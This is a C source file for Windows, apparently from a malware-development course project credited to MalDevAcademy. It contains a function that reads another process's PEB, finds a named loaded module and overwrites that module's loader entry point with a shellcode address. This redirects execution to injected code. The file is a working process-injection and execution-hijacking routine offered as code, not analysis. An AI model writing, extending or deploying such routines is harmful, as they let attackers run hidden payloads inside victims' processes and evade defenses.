#include <Windows.h>
#include <stdio.h>
#include "structs.h"
#include "common.h"

extern NT_API g_nt;

BOOL StrCompareW(LPCWSTR szStr1, LPCWSTR szStr2) {	// by @NUL0x4C | @mrd0x : MalDevAcademy 

	WCHAR lStr1[MAX_PATH];
	WCHAR lStr2[MAX_PATH];

	int len1 = lstrlenW(szStr1);
	int len2 = lstrlenW(szStr2);

	int i = 0;
	int j = 0;

	if (len1 >= MAX_PATH || len2 >= MAX_PATH) {
		return FALSE;
	}

	for (i = 0; i < len1; i++) {
		lStr1[i] = (WCHAR)tolower(szStr1[i]);
	}
	lStr1[i++] = L'\0';

	for (j = 0; j < len2; j++) {
		lStr2[j] = (WCHAR)tolower(szStr2[j]);
	}
	lStr2[j++] = L'\0';

	if (lstrcmpiW(lStr1, lStr2) == 0) {
		return TRUE;
	}

	return FALSE;
}

BOOL PatchEntryPoint(IN LPCWSTR szModuleName, IN HANDLE hProcess, IN PVOID pShellcodeAdress) {

	PROCESS_BASIC_INFORMATION	pbi = { 0 };
	NTSTATUS					STATUS = 0x00;
	ULONG						ulRetLength = 0;
	PEB							Peb = { 0 };
	SIZE_T						sBytesRead = NULL;
	SIZE_T						sBytesWritten = NULL;
	PEB_LDR_DATA				pebLdrData = { 0 };

	printf("[i] Reading remote PEB ...\n");

	if ((STATUS = g_nt.pNtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &ulRetLength)) != 0x00){
		printf("[!] NtQueryInformationProcess Failed with error: 0x%0.8X", STATUS);
		return FALSE;
	}

	// Read the PEB from the remote process
	if ((STATUS = g_nt.pNtReadVirtualMemory(hProcess, (LPCVOID)pbi.PebBaseAddress, &Peb, sizeof(PEB), &sBytesRead)) != 0x00) {
		printf("[!] NtReadVirtualMemory Failed with error: 0x%0.8X\n", STATUS);
		return FALSE;
	}
	printf("[+] Remote process' PEB is located at 0x%p.\n", pbi.PebBaseAddress);

	if ((STATUS = g_nt.pNtReadVirtualMemory(hProcess, (LPCVOID)Peb.Ldr, &pebLdrData, sizeof(PEB_LDR_DATA), &sBytesRead)) != 0x00) {
			printf("[!] NtReadVirtualMemory Failed with error: 0x%0.8X\n", STATUS);
			return FALSE;
	}

	printf("[+] PEB's double-linked list found.\n");

	// Iterate over the remote process PEB's loaded modules list
	LIST_ENTRY* pLdrListHead = (LIST_ENTRY*)pebLdrData.InLoadOrderModuleList.Flink;
	LIST_ENTRY* pLdrCurrentModule = pebLdrData.InLoadOrderModuleList.Flink;

	do
	{
		LDR_DATA_TABLE_ENTRY ldrTableEntry = { 0 };
		// Adjust the pointer to get the actual LDR_DATA_TABLE_ENTRY from the list entry
		LDR_DATA_TABLE_ENTRY* ldrEntryPtr = CONTAINING_RECORD(pLdrCurrentModule, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
		
		// Reading the module entry
		if ((STATUS = g_nt.pNtReadVirtualMemory(hProcess, (LPCVOID)pLdrCurrentModule, &ldrTableEntry, sizeof(LDR_DATA_TABLE_ENTRY), &sBytesRead)) != 0x00) {
			printf("[!] NtReadVirtualMemory Failed with error: 0x%0.8X\n", STATUS);
			return FALSE;
		}

		WCHAR wcFullDllName[MAX_PATH] = { 0 };
		if (ldrTableEntry.FullDllName.Length > 0) {
			if ((STATUS = g_nt.pNtReadVirtualMemory(hProcess, (LPCVOID)ldrTableEntry.FullDllName.Buffer, &wcFullDllName, ldrTableEntry.FullDllName.Length, &sBytesRead)) != 0x00) {
				printf("[!] NtReadVirtualMemory Failed with error: 0x%0.8X\n", STATUS);
				return FALSE;
			}

			if (StrCompareW(wcFullDllName, szModuleName)) {
				if (ldrTableEntry.DllBase != NULL && ldrTableEntry.SizeOfImage != 0) {
					ldrTableEntry.EntryPoint = pShellcodeAdress;
					// Write the modified entry back
					STATUS = g_nt.pNtWriteVirtualMemory(hProcess, ldrEntryPtr, &ldrTableEntry, sizeof(LDR_DATA_TABLE_ENTRY), &sBytesWritten);
					if (STATUS != 0x00) {
						printf("\t[!] PEB patching failed.\n");
						break; // Exit the loop on error
					}
					printf("[+] Success!");
					break;
				}
			}
			
		}
		pLdrCurrentModule = ldrTableEntry.InLoadOrderLinks.Flink;
	} while (pLdrListHead != pLdrCurrentModule);
	return FALSE;
}